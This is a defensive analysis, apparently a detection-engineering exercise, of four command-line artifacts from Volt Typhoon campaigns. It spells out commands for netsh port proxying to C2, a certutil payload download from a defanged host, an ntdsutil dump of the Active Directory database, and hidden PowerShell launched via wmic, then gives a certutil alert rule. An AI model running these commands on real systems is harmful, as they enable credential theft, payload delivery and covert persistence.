# 1. Executive Summary

We are operating upon 4 command line artifacts observed in Volt Typhoon campaigns. The objective is to identify the information needed to create an alert. 

## The Artifacts 

Command A: ```netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.2.3 connectport=8443 protocol=tcp```

Command B: ```certutil.exe -urlcache -split -f hxxp://10.1.2.3/payload.exe C:\Windows\Temp\payload.exe```

Command C: ```ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\Pro" q q```

Command D: ```wmic process call create "cmd.exe /c start powershell.exe -windowstyle hidden -c..."```

# 2. Tool Analysis 

Firstly we need to identify the binary being used on each command. Second, what is the intent behind the command, what is the attacker trying to accomplish. 

### Command A

**Command**: ```netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.2.3 connectport=8443 protocol=tcp``` 

**Binary**: netsh.exe 

**Full Path**: C:\Windows\System32\netsh.exe

From [cisa.gov](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a) 

> Netsh is a built-in Windows command line scripting utility that can display or modify the network settings of a host, including the Windows Firewall. The portproxy add command is used to create a host:port proxy that will forward incoming connections on the provided listenaddress and listenport to the connectaddress and connectport.

The attacker sets this up as a way of gaining persistence. The connectaddress is set up to be an IPv4 address internal to the network. Attackers compromise Edge devices, such as a Small Office / Home Office (SOHO) router. This portproxy forwards data to the SOHO router which forwards the data to the C2 servers, thus creating a trail that looks legitimate to any security analysts. 

The v4tov4 in the command is used to tell the binary that the proxy is to be setup between one IPv4 host to another IPv4 host. 

### Command B

**Command**: ```certutil.exe -urlcache -split -f hxxp://10.1.2.3/payload.exe C:\Windows\Temp\payload.exe```

**Binary**: certutil.exe

**Full Path**: C:\Windows\System32\certutil.exe

Breaking down the command, it invokes the certutil binary which can be used view Certificate Authority (CA) config info, configure Certificate Services, verify certificates, key pairs and certificate chains. It is a binary that is implicitly trusted by the Windows Operating System. The ```-urlcache``` option tells the tool to perform URL cache management actions. This functionality allows it to retrieve content from a URL. 

```-split``` forces the file to be downloaded in chunks and then reassembled. In this context, it is being used to ensure that the file is saved on the disk rather than just cached in memory. ```-f``` stands for force overwrite. It overwrites the destination file if it already exists ensuring the download succeeds without any user prompts. 

When executed this command connects to the given IP and downloads a file to the given local host destination in the temp directory. It is a pretty well known tactic even listed in the [MITRE](https://attack.mitre.org/software/S0160/) database [T1105](https://attack.mitre.org/techniques/T1105/). The objective may very simply be Command and Control. 

### Command C

Command: ```ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\Pro" q q```

Binary: ntdsutil.exe

Full Path: C:\Windows\System32\ntdsutil.exe

ntdsutil is a command-line tool for sysadmins to manage and maintain Active Directory Domain Services on Windows Servers. 

In the above command, ```ac i ntds``` is short form notation for ```activate instance ntds``` setting ```ntds``` as the active instance for ntdsutil to use. ```ifm``` stands for Install From Media. Creates installation media to be used with DCPromoter so the server will not need to copy data from another domain controller on the network. so the command enters the IFM mode, then tells the tool to create a Full backup of the AD database at the specified path (C:\Windows\Temp\Pro). It then quits the IFM menu and then quits the ntdsutil tool. 

IFM is a subcommand of the ntdsutil. From [Microsoft](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732530(v=ws.11))

> Creates installation media for writable (full) domain controllers, read-only domain controllers (RODCs), and instances of Active Directory Lightweight Directory Services (AD LDS)

This generates two critical artifacts: the ntds.dit database containing every user's password hash and Registry\SYSTEM registry hive containing the "Boot Key" needed to decrypt the ntds.dit file. With these two files, an attacker can exfiltrate them and crack every password in the organization without triggering any more alarms on the domain controller

### Command D

**Command**: ```wmic process call create "cmd.exe /c start powershell.exe -windowstyle hidden -c..."```

**Binary**: wmic.exe

**Full Path**: C:\Windows\System32\wbem\wmic.exe

```wmic process call create``` uses the Windows Management Instrumentation Command-line utility to spawn a new process. ```cmd.exe /c``` tells cmd to execute the following string and then terminate immediately. ```start powershell.exe -windowstyle hidden``` is the string passed to cmd to essentially spawn a new powershell instance without rendering a visible window on the user's desktop. ```-c...``` at the end there is short for -Command. The ... represents the actual payload that will be executed silently in the background. 

This is a method of evasion as such a complex method of executing a script would essentially become background noise for an analyst. The parent-child process tree gets broken when using wmic to spawn a new process. 

# 3. Alert

**Title**: CertUtil Download Verification

**Logic**: Process Name = certutil.exe AND Command Line contains (urlcache AND split) 

**False Positive Check**: Exclude if Parent Process is a known software updater (e.g., ccmexec.exe for SCCM).